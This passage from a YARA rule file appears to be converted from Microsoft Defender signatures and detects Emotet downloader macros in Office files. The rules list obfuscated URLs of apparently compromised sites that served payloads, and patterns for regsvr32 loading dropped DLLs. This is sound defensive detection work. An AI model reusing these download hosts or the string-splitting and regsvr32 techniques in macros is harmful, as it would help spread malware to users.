        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {72 22 26 22 65 67 22 26 22 73 76 22 26 22 72 33 22 26 22 32 2e 65 78 65 [0-10] 53 79 73 22 26 22 57 6f 77 22 26 22 36 34 5c [0-3] 5c 57 22 26 22 69 22 26 22 6e 64 6f 22 26 22 77 73 [0-47] 5c 64 66 65 62 2e 73 65 73 [0-6] 5c 64 66 65 62 2e 73 65 73}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_MMPD_2147815279_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.MMPD!MTB"
        threat_id = "2147815279"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "broadwaymelody.ca/stats/DVYw4Qpcf1yo/" ascii //weight: 1
        $x_1_2 = "bigideas.com.au/images/w5FLAJPmvbk9/" ascii //weight: 1
        $x_1_3 = "webstream.jp/died-wing/oOzfVc/" ascii //weight: 1
        $x_1_4 = "24hbinhphuoc.com.vn/data/FosZ5GFS6PP3kshbVn7/" ascii //weight: 1
        $x_1_5 = "bmnegociosinmobiliarios.com.ar/cgi-bin/bijhAMWReA0H3i8a/" ascii //weight: 1
        $x_1_6 = "binnuryetikdanismanlik.com.tr/images/VbytyOFtS1MF/" ascii //weight: 1
        $x_1_7 = "breedid.nl/cgi-bin/aCbt/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_NPD_2147815322_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.NPD!MTB"
        threat_id = "2147815322"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ausnz.net/2010wc/RhAYVPNypjphNNk6J/" ascii //weight: 1
        $x_1_2 = "belisip.net/libs/Swift-5.1.0/F5XU7EuPePQ/" ascii //weight: 1
        $x_1_3 = "blog.centerking.top/wp-includes/WEIuPafz0bS/" ascii //weight: 1
        $x_1_4 = "edu-media.cn/wp-admin/TOu/" ascii //weight: 1
        $x_1_5 = "ppiabanyuwangi.or.id/lulu-1937/daURDNUyso/" ascii //weight: 1
        $x_1_6 = "lydt.cc/wp-includes/jprpcO8U/" ascii //weight: 1
        $x_1_7 = "acerestoration.co.za/wp-admin/gJqMBYhQHYsDE/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_OPD_2147815491_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.OPD!MTB"
        threat_id = "2147815491"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "iqraacfindia.org/wp-admin/dG/" ascii //weight: 1
        $x_1_2 = "he.adar-and-ido.com/wp-admin/xk7D/" ascii //weight: 1
        $x_1_3 = "w\"&\"ww.digigoal.fr/wp-admin/VfU0aIj/" ascii //weight: 1
        $x_1_4 = "carzino.atwebpages.com/assets/QwlhxhsYfkYntLW0haX/" ascii //weight: 1
        $x_1_5 = "al-brik.com/vb/mMQlbHPCX/" ascii //weight: 1
        $x_1_6 = "apexcreative.co.kr/adm/VdiKTcljSBORQRrsh66X/" ascii //weight: 1
        $x_1_7 = "biantarajaya.com/awstats-icon/VR5wDEvBj/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RPAD_2147815593_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RPAD!MTB"
        threat_id = "2147815593"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "d\"&\"ebr\"&\"oad\"&\"lin\"&\"k.c\"&\"om/br\"&\"och\"&\"u\"&\"re/D/\"" ascii //weight: 1
        $x_1_2 = "cornerstonecreativestudios.com/boards/ilsFKKHH7GaR/\",\"" ascii //weight: 1
        $x_1_3 = "csm101.com/transam/T7wblKicmeBabj2h/\",\"/" ascii //weight: 1
        $x_1_4 = "dacentec2.layeredserver.com/speedtest/yjnnw/\",\"" ascii //weight: 1
        $x_1_5 = "datie-tw.com/test/yXPr0DO/\",\"" ascii //weight: 1
        $x_1_6 = "dcphoto01.com/wp-admin/J/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RPAD_2147815593_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RPAD!MTB"
        threat_id = "2147815593"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"h\"&\"ttp\"&\"s://w\"&\"ww.c\"&\"lin\"&\"tm\"&\"ore\"&\"y.c\"&\"om/w\"&\"p-c\"&\"on\"&\"te\"&\"nt/QS\"&\"zb\"&\"H8I\"&\"kl\"&\"8E/\"," ascii //weight: 1
        $x_1_2 = "\"h\"&\"tt\"&\"ps://cib\"&\"erfa\"&\"lla\"&\"s.co\"&\"m/w\"&\"p-a\"&\"dm\"&\"in/4\"&\"sU1\"&\"dA\"&\"Ty/" ascii //weight: 1
        $x_1_3 = "\"h\"&\"tt\"&\"p://co\"&\"d\"&\"e78\"&\"6.c\"&\"o\"&\"m/b\"&\"eel\"&\"dO\"&\"L\"&\"D/AT\"&\"nNk\"&\"31\"&\"6" ascii //weight: 1
        $x_1_4 = "\"h\"&\"tt\"&\"p://co\"&\"mba\"&\"tente\"&\"rpri\"&\"se\"&\"s.c\"&\"om/c\"&\"gi-b\"&\"in/1B\"&\"abm\"&\"NqCK\"&\"Bx\"&\"UIz\"&\"Uy" ascii //weight: 1
        $x_1_5 = "\"h\"&\"tt\"&\"p://s\"&\"d-16\"&\"8\"&\"462\"&\"5-h\"&\"00\"&\"00\"&\"1.fe\"&\"ro\"&\"zo.n\"&\"et/Pag\"&\"ina\"&\"M\"&\"asVie\"&\"ja13\"&\"216\"&\"54/F\"&\"1M5\"&\"dB\"&\"u8a\"&\"xu\"&\"Qkx\"&\"0p\"&\"8/" ascii //weight: 1
        $x_1_6 = "\"h\"&\"ttp\"&\"s://c\"&\"om\"&\"arca\"&\"ho\"&\"y.c\"&\"om.a\"&\"r/w\"&\"p-co\"&\"nt\"&\"en\"&\"t/S\"&\"1nkr\"&\"xC\"&\"cD\"&\"V8\"&\"9D\"&\"Lp\"&\"TX\"&\"hq\"&\"C" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PPD_2147815643_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PPD!MTB"
        threat_id = "2147815643"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://c\"&\"on\"&\"tr\"&\"id.c\"&\"o\"&\"m/6v\"&\"w\"&\"kQm\"&\"R\"&\"U/" ascii //weight: 1
        $x_1_2 = "://ct\"&\"fil\"&\"ms.c\"&\"om/k\"&\"s/2y\"&\"gJu\"&\"GV\"&\"0/" ascii //weight: 1
        $x_1_3 = "://co\"&\"rd\"&\"clip\"&\"so\"&\"rg\"&\"a\"&\"niz\"&\"er.c\"&\"o\"&\"m/c\"&\"a\"&\"bl\"&\"e-h\"&\"ol\"&\"de\"&\"r-2\"&\"e/a/" ascii //weight: 1
        $x_1_4 = "://d\"&\"ah\"&\"ia\"&\"k\"&\"a.c\"&\"om/D\"&\"N\"&\"D/J\"&\"uB\"&\"l\"&\"O\"&\"iT8\"&\"Ix\"&\"j/" ascii //weight: 1
        $x_1_5 = "://w\"&\"w\"&\"w.c\"&\"ol\"&\"fin\"&\"ca\"&\"s.c\"&\"o\"&\"m/t\"&\"mp/Fv\"&\"yL\"&\"s/" ascii //weight: 1
        $x_1_6 = ":/\"&\"/c\"&\"o\"&\"n\"&\"t\"&\"e\"&\"n\"&\"t\"&\"uni\"&\"o\"&\"n.n\"&\"et/ne\"&\"w\"&\"w\"&\"ebs\"&\"it\"&\"e/UX\"&\"kk\"&\"k/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PKST_2147815673_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PKST!MTB"
        threat_id = "2147815673"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "regsvr32.exe" ascii //weight: 1
        $x_1_2 = "SysWow64\\" ascii //weight: 1
        $x_1_3 = "\\Windows\\" ascii //weight: 1
        $x_1_4 = ".c\"&\"lin\"&\"tm\"&\"ore\"&\"y.c\"&\"om/w\"&\"p-c\"&\"on\"&\"te\"&\"nt/QS\"&\"zb\"&\"H8I\"&\"kl\"&\"8E/\",\"" ascii //weight: 1
        $x_1_5 = "cib\"&\"erfa\"&\"lla\"&\"s.co\"&\"m/w\"&\"p-a\"&\"dm\"&\"in/4\"&\"sU1\"&\"dA\"&\"Ty/\",\"" ascii //weight: 1
        $x_1_6 = "co\"&\"d\"&\"e78\"&\"6.c\"&\"o\"&\"m/b\"&\"eel\"&\"dO\"&\"L\"&\"D/AT\"&\"nNk\"&\"31\"&\"6/\",\"" ascii //weight: 1
        $x_1_7 = "co\"&\"mba\"&\"tente\"&\"rpri\"&\"se\"&\"s.c\"&\"om/c\"&\"gi-b\"&\"in/1B\"&\"abm\"&\"NqCK\"&\"Bx\"&\"UIz\"&\"Uy/\",\"" ascii //weight: 1
        $x_1_8 = "s\"&\"d-16\"&\"8\"&\"462\"&\"5-h\"&\"00\"&\"00\"&\"1.fe\"&\"ro\"&\"zo.n\"&\"et/Pag\"&\"ina\"&\"M\"&\"asVie\"&\"ja13\"&\"216\"&\"54/F\"&\"1M5\"&\"dB\"&\"u8a\"&\"xu\"&\"Qkx\"&\"0p\"&\"8/\",\"" ascii //weight: 1
        $x_1_9 = "c\"&\"om\"&\"arca\"&\"ho\"&\"y.c\"&\"om.a\"&\"r/w\"&\"p-co\"&\"nt\"&\"en\"&\"t/S\"&\"1nkr\"&\"xC\"&\"cD\"&\"V8\"&\"9D\"&\"Lp\"&\"TX\"&\"hq\"&\"C/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VQSM_2147815710_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VQSM!MTB"
        threat_id = "2147815710"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "st\"&\"on\"&\"efl\"&\"ym\"&\"ar\"&\"ket\"&\"ing.c\"&\"o\"&\"m/wm\"&\"inj\"&\"ury\"&\"law.c\"&\"o\"&\"m/iY\"&\"IN\"&\"P/" ascii //weight: 1
        $x_1_2 = "fu\"&\"erz\"&\"a9\"&\"9fm.c\"&\"o\"&\"m/c\"&\"gi-b\"&\"in/h\"&\"m5\"&\"Bi\"&\"66/" ascii //weight: 1
        $x_1_3 = "u\"&\"ni\"&\"co\"&\"rn-u\"&\"nd\"&\"er\"&\"we\"&\"ar.g\"&\"r/w\"&\"p-c\"&\"on\"&\"te\"&\"nt/n\"&\"UQ\"&\"lR\"&\"u/" ascii //weight: 1
        $x_1_4 = "l\"&\"av\"&\"am\"&\"ea\"&\"pp.c\"&\"l/w\"&\"p-sn\"&\"ap\"&\"sh\"&\"ot\"&\"s/hi\"&\"mv\"&\"0r\"&\"bB\"&\"of\"&\"mA\"&\"Bf\"&\"3e\"&\"wN/" ascii //weight: 1
        $x_1_5 = "n\"&\"ie\"&\"nk\"&\"z.n\"&\"l/s\"&\"cr\"&\"ip\"&\"ts/8\"&\"BB\"&\"Sv\"&\"3e\"&\"nV\"&\"Me\"&\"eU\"&\"4y/" ascii //weight: 1
        $x_1_6 = "w\"&\"w\"&\"w.n\"&\"4i.e\"&\"s/v\"&\"ide\"&\"os/5\"&\"5yT\"&\"6V\"&\"ji\"&\"M/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VQSM_2147815710_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VQSM!MTB"
        threat_id = "2147815710"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://c\"&\"li\"&\"pa\"&\"cc.c\"&\"\"&\"om/i\"&\"mg/doX\"&\"w\"&\"68d7\"&\"bqxxh\"&\"wu\"&\"xN\"&\"b0\"&\"N/" ascii //weight: 1
        $x_1_2 = "http://ch\"&\"adhy\"&\"m\"&\"as.c\"&\"om/w\"&\"p-a\"&\"dm\"&\"in/y\"&\"o1\"&\"1rET\"&\"lmz\"&\"RqZ\"&\"lC5\"&\"6B/" ascii //weight: 1
        $x_1_3 = "http://m\"&\"ul\"&\"mat\"&\"do\"&\"l.c\"&\"om/a\"&\"dm/Y\"&\"O7\"&\"lp\"&\"LlRn\"&\"PI\"&\"M/" ascii //weight: 1
        $x_1_4 = "http://f\"&\"mes\"&\"per\"&\"a\"&\"nza9\"&\"45.c\"&\"om/f\"&\"o\"&\"nt\"&\"s/M\"&\"ta/" ascii //weight: 1
        $x_1_5 = "http://cl\"&\"anw\"&\"at\"&\"so\"&\"n.c\"&\"o.u\"&\"k/pe\"&\"r\"&\"son\"&\"al/D\"&\"xlC\"&\"bK\"&\"5yx\"&\"bq\"&\"q1j\"&\"qP/" ascii //weight: 1
        $x_1_6 = "https://cla\"&\"s\"&\"si\"&\"cp\"&\"ai\"&\"nt.n\"&\"et/w\"&\"p-c\"&\"on\"&\"te\"&\"nt/Vx6\"&\"iP4\"&\"KOyo\"&\"Zuiw\"&\"sy\"&\"W/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VGSM_2147815764_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VGSM!MTB"
        threat_id = "2147815764"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"tt\"&\"p:/\"&\"/dh\"&\"ar\"&\"ia\"&\"n.o\"&\"rg/_s\"&\"ha\"&\"re\"&\"dte\"&\"mp\"&\"la\"&\"te\"&\"s/D3\"&\"Qgy\"&\"tUZ\"&\"sO7\"&\"kor\"&\"YQr\"&\"G/" ascii //weight: 1
        $x_1_2 = "h\"&\"tt\"&\"p://d\"&\"ig\"&\"it\"&\"alri\"&\"pp\"&\"le.c\"&\"om/s\"&\"cri\"&\"pt\"&\"s/4o\"&\"vL\"&\"Pf\"&\"q/" ascii //weight: 1
        $x_1_3 = "h\"&\"tt\"&\"p:/\"&\"/w\"&\"ww.co\"&\"nst\"&\"ru\"&\"lan\"&\"di\"&\"a.c\"&\"om/te\"&\"mpl\"&\"at\"&\"es/B\"&\"rR\"&\"f8\"&\"QDl\"&\"oU\"&\"qN\"&\"yTA\"&\"dX\"&\"E/" ascii //weight: 1
        $x_1_4 = "h\"&\"tt\"&\"ps://de\"&\"mb\"&\"ek.c\"&\"o.z\"&\"a/s\"&\"as\"&\"s/3\"&\"0C/" ascii //weight: 1
        $x_1_5 = "h\"&\"tt\"&\"p://po\"&\"rtr\"&\"ett\"&\"en\"&\"be\"&\"el\"&\"d.n\"&\"l/lay\"&\"ou\"&\"ts/sf\"&\"Gs\"&\"F/" ascii //weight: 1
        $x_1_6 = "h\"&\"tt\"&\"p://w\"&\"ww.di\"&\"e1\"&\"3\"&\"we\"&\"ize\"&\"n.a\"&\"t/e\"&\"rr\"&\"or/aM\"&\"099\"&\"L/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QPD_2147815799_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QPD!MTB"
        threat_id = "2147815799"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ":/\"&\"/w\"&\"w\"&\"w.f\"&\"or\"&\"en\"&\"s\"&\"is\"&\"b\"&\"il\"&\"is\"&\"i\"&\"m.c\"&\"o\"&\"m/a\"&\"n\"&\"k\"&\"ar\"&\"a/bp\"&\"ls\"&\"m\"&\"Kf\"&\"a\"&\"KA\"&\"w\"&\"A\"&\"y\"&\"a\"&\"v\"&\"N\"&\"j/" ascii //weight: 1
        $x_1_2 = ":/\"&\"/w\"&\"w\"&\"w.fa\"&\"it\"&\"ma\"&\"is\"&\"o\"&\"n.u\"&\"k/w\"&\"p-a\"&\"d\"&\"m\"&\"in/B\"&\"Z\"&\"M\"&\"oK/" ascii //weight: 1
        $x_1_3 = ":/\"&\"/w\"&\"w\"&\"w.p\"&\"a\"&\"ra\"&\"pet\"&\"yr\"&\"s.c\"&\"z/w\"&\"p-c\"&\"on\"&\"t\"&\"en\"&\"t/up\"&\"lo\"&\"a\"&\"ds/U\"&\"Tn\"&\"G\"&\"7G\"&\"KK\"&\"kZ\"&\"f/" ascii //weight: 1
        $x_1_4 = ":/\"&\"/w\"&\"w\"&\"w.fa\"&\"hr\"&\"ie\"&\"fe.c\"&\"o\"&\"m.t\"&\"r/ya\"&\"rg\"&\"it\"&\"ay\"&\"kar\"&\"ar\"&\"la\"&\"ri/a\"&\"V\"&\"g/" ascii //weight: 1
        $x_1_5 = ":/\"&\"/w\"&\"w\"&\"w.dr\"&\"cn\"&\"o.s\"&\"k/_s\"&\"u\"&\"b/Fc\"&\"Eg\"&\"wP\"&\"u\"&\"gDI\"&\"7w\"&\"r\"&\"2/" ascii //weight: 1
        $x_1_6 = ":/\"&\"/w\"&\"w\"&\"w.w\"&\"ho\"&\"w.f\"&\"r/w\"&\"p-in\"&\"clu\"&\"de\"&\"s/aZ\"&\"o7\"&\"8J\"&\"mH\"&\"B\"&\"o\"&\"Em\"&\"W\"&\"6\"&\"fV\"&\"Q/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AMTT_2147815844_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AMTT!MTB"
        threat_id = "2147815844"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {72 65 67 73 76 72 33 32 2e 65 78 65 [0-10] 53 79 73 57 6f 77 36 34 5c [0-10] 5c 57 69 6e 64 6f 77 73 5c [0-10] 2c 30 2c [0-10] 2c 30 2c 30 29 [0-47] 22 68}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VOSM_2147815848_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VOSM!MTB"
        threat_id = "2147815848"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"tt\"&\"p:/\"&\"/d\"&\"r\"&\"vi\"&\"sh\"&\"al\"&\"c\"&\"h\"&\"e\"&\"st\"&\"cl\"&\"in\"&\"ic.c\"&\"o\"&\"m/w\"&\"p-i\"&\"n\"&\"cl\"&\"u\"&\"d\"&\"e\"&\"s/S\"&\"qq\"&\"C\"&\"Z\"&\"Q6y\"&\"2\"&\"uy\"&\"FF/" ascii //weight: 1
        $x_1_2 = "h\"&\"tt\"&\"p:/\"&\"/f\"&\"un\"&\"e\"&\"s\"&\"to\"&\"ta\"&\"l.c\"&\"o\"&\"m/5\"&\"a\"&\"c\"&\"l\"&\"o\"&\"1e\"&\"m/2\"&\"1\"&\"U/" ascii //weight: 1
        $x_1_3 = "h\"&\"tt\"&\"p:/\"&\"/g-w\"&\"iz\"&\"co\"&\"m\"&\"p\"&\"u\"&\"t\"&\"e\"&\"r\"&\"s.c\"&\"o\"&\"m/p\"&\"a\"&\"r\"&\"t\"&\"y/6\"&\"1\"&\"W\"&\"0\"&\"o\"&\"v\"&\"B\"&\"u\"&\"8\"&\"6/" ascii //weight: 1
        $x_1_4 = "h\"&\"tt\"&\"p:/\"&\"/p\"&\"r\"&\"i\"&\"m\"&\"e\"&\"f\"&\"i\"&\"n\"&\"d.c\"&\"o\"&\"m/1\"&\"m\"&\"a\"&\"l\"&\"l-u\"&\"k/h\"&\"5/" ascii //weight: 1
        $x_1_5 = "h\"&\"tt\"&\"p://l\"&\"a-cs\"&\"i.c\"&\"o\"&\"m/m\"&\"t-a\"&\"d\"&\"m\"&\"i\"&\"n/B\"&\"B\"&\"7/" ascii //weight: 1
        $x_1_6 = "h\"&\"ttp\"&\"s:/\"&\"/p\"&\"a\"&\"n\"&\"c\"&\"o\"&\"o\"&\"k.c\"&\"o\"&\"m/n\"&\"e\"&\"w\"&\"si\"&\"t\"&\"e/H\"&\"6x\"&\"x\"&\"eL\"&\"e\"&\"f\"&\"X\"&\"1I\"&\"2\"&\"vg\"&\"J\"&\"F\"&\"M\"&\"1\"&\"Y/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVI_2147815880_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVI!MTB"
        threat_id = "2147815880"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {72 65 67 73 76 72 33 32 2e 65 78 65 [0-95] 22 37 37 37 37 22 2c 22 [0-10] 52 45 54 55 52 4e [0-10] 5c 6e 68 74 68 2e 64 6c 6c [0-10] 5c 6e 68 74 68 2e 64 6c 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QPDW_2147815881_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QPDW!MTB"
        threat_id = "2147815881"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ":/\"&\"/f\"&\"c\"&\"c\"&\"a\"&\"t\"&\"i\"&\"n\"&\"s\"&\"a\"&\"a\"&\"t.c\"&\"o\"&\"m/w\"&\"p-c\"&\"o\"&\"n\"&\"t\"&\"e\"&\"n\"&\"t/C\"&\"w\"&\"3\"&\"a\"&\"R\"&\"67\"&\"92\"&\"f/" ascii //weight: 1
        $x_1_2 = ":/\"&\"/f\"&\"a\"&\"b\"&\"u\"&\"l\"&\"o\"&\"u\"&\"s\"&\"w\"&\"e\"&\"b\"&\"d\"&\"e\"&\"s\"&\"i\"&\"g\"&\"n.n\"&\"e\"&\"t/i\"&\"n\"&\"v\"&\"o\"&\"i\"&\"c\"&\"e/\"&\"m/" ascii //weight: 1
        $x_1_3 = ":/\"&\"/f\"&\"r\"&\"e\"&\"e\"&\"m\"&\"a\"&\"n\"&\"y\"&\"l\"&\"a\"&\"l\"&\"u\"&\"z.c\"&\"o\"&\"m/d\"&\"o\"&\"w\"&\"n\"&\"l\"&\"o\"&\"a\"&\"d\"&\"s/8\"&\"d\"&\"R9\"&\"p\"&\"g\"&\"N\"&\"B\"&\"F\"&\"t\"&\"z/" ascii //weight: 1
        $x_1_4 = ":/\"&\"/fr\"&\"e\"&\"e\"&\"w\"&\"e\"&\"bs\"&\"it\"&\"e\"&\"d\"&\"ir\"&\"e\"&\"ct\"&\"o\"&\"r\"&\"y.c\"&\"o\"&\"m/w\"&\"p-in\"&\"clu\"&\"de\"&\"s/v\"&\"2\"&\"q\"&\"F\"&\"A\"&\"l\"&\"M\"&\"Z\"&\"E\"&\"L\"&\"R\"&\"k\"&\"xb\"&\"z/" ascii //weight: 1
        $x_1_5 = ":/\"&\"/f\"&\"u\"&\"t\"&\"a\"&\"b\"&\"a.y\"&\"o\"&\"u\"&\"c\"&\"h\"&\"i\"&\"e\"&\"n.n\"&\"e\"&\"t/w\"&\"p-c\"&\"o\"&\"n\"&\"t\"&\"e\"&\"n\"&\"t/s\"&\"S\"&\"J\"&\"q\"&\"J/" ascii //weight: 1
        $x_1_6 = ":/\"&\"/d\"&\"o\"&\"m\"&\"i\"&\"n\"&\"i\"&\"o\"&\"n\"&\"a\"&\"i.o\"&\"r\"&\"g/w\"&\"p-i\"&\"n\"&\"cl\"&\"u\"&\"d\"&\"e\"&\"s/T\"&\"5\"&\"q\"&\"X\"&\"A\"&\"R\"&\"8\"&\"p\"&\"5/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AMTA_2147815909_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AMTA!MTB"
        threat_id = "2147815909"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {22 68 22 26 22 74 74 22 26 22 70 [0-159] 22 2c 22 [0-255] 22 68 22 26 22 74 74 22 26 22 70}  //weight: 1, accuracy: Low
        $x_1_2 = {22 68 22 26 22 74 74 22 26 22 70 [0-159] 22 2c 22 [0-255] 22 68 22 26 22 74 74 70 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
